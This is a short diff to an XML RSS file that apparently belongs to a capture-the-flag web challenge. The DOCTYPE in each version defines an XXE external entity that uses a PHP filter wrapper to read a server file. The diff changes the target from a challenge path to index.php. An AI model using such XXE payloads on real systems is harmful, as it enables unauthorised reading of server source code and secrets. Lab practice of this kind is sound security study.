@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE replace [<!ENTITY payload SYSTEM "php://filter/read=string.toupper/resource=file:///challenge/web-serveur/ch29/index.php"> ]>  
+<!DOCTYPE replace [<!ENTITY payload SYSTEM "php://filter/read=string.toupper/resource=index.php"> ]>  
 <rss version="2.0">
 <channel>
   <title>W3Schools Home Page </title>
